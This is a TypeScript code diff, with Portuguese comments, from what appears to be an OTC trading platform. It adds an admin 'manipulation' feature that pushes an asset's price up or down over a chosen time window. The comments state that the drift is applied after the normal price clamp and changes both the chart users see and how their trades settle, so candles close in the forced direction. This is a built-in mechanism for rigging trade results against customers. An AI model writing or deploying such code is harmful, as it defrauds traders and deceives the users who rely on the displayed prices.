@@ -30,6 +30,50 @@ export interface OTCAsset {
   decimals: number
 }
 
+// =============================================
+// MANIPULACAO (admin) - forca a direcao dos candles
+// =============================================
+// Uma manipulacao aplica um "drift" direcional deterministico sobre o preco de um ativo
+// durante uma janela [startTime, endTime]. Como getLivePrice e usado tanto pelo grafico
+// (cliente) quanto pela liquidacao das operacoes, forcar a direcao aqui afeta o que o
+// usuario VE e o resultado que ele RECEBE de forma consistente.
+export interface Manipulation {
+  symbol: string
+  direction: "up" | "down"
+  startTime: number // unix seconds
+  endTime: number // unix seconds
+  strength: number // 0..100
+}
+
+let activeManipulations: Manipulation[] = []
+
+export function setManipulations(list: Manipulation[]) {
+  activeManipulations = Array.isArray(list) ? list : []
+}
+
+export function getManipulations(): Manipulation[] {
+  return activeManipulations
+}
+
+// Retorna o deslocamento de preco a aplicar para um ativo em um dado timestamp.
+function manipulationDrift(asset: OTCAsset, timestamp: number): number {
+  if (!activeManipulations.length) return 0
+  let drift = 0
+  for (let i = 0; i < activeManipulations.length; i++) {
+    const m = activeManipulations[i]
+    if (m.symbol !== asset.symbol) continue
+    if (timestamp < m.startTime || timestamp > m.endTime) continue
+    const dir = m.direction === "up" ? 1 : -1
+    const strength = Math.max(0, Math.min(100, m.strength)) / 100
+    const elapsedMin = (timestamp - m.startTime) / 60
+    // Rampa monotonica: ~0.18%..0.9% do preco base por minuto conforme a forca.
+    // Garante que cada candle feche alem da sua abertura no sentido forcado.
+    const rampPerMin = asset.basePrice * (0.0018 + strength * 0.0072)
+    drift += dir * rampPerMin * elapsedMin
+  }
+  return drift
+}
+
 export const OTC_ASSETS: OTCAsset[] = [
   { symbol: "EURUSD_OTC", name: "EUR/USD OTC", basePrice: 1.085, pipSize: 0.00001, volatility: 35, icon: "EU", decimals: 5 },
   { symbol: "GBPUSD_OTC", name: "GBP/USD OTC", basePrice: 1.265, pipSize: 0.00001, volatility: 40, icon: "GB", decimals: 5 },
@@ -128,6 +172,14 @@ function getLivePrice(asset: OTCAsset, timestamp: number): number {
   // Hard cap proporcional a propria banda, para nunca "estourar" a escala do grafico.
   const hardCap = asset.basePrice * bandPct * 1.3
   price = Math.max(asset.basePrice - hardCap, Math.min(asset.basePrice + hardCap, price))
+
+  // Manipulacao do admin: aplicada DEPOIS do clamp, para poder mover o preco alem da banda
+  // normal e forcar visivelmente a direcao dos candles (e o resultado das operacoes).
+  const drift = manipulationDrift(asset, timestamp)
+  if (drift !== 0) {
+    price += drift
+    if (price < asset.pipSize) price = asset.pipSize // nunca negativo
+  }
 
   const prec = asset.decimals
   return Number(price.toFixed(prec))
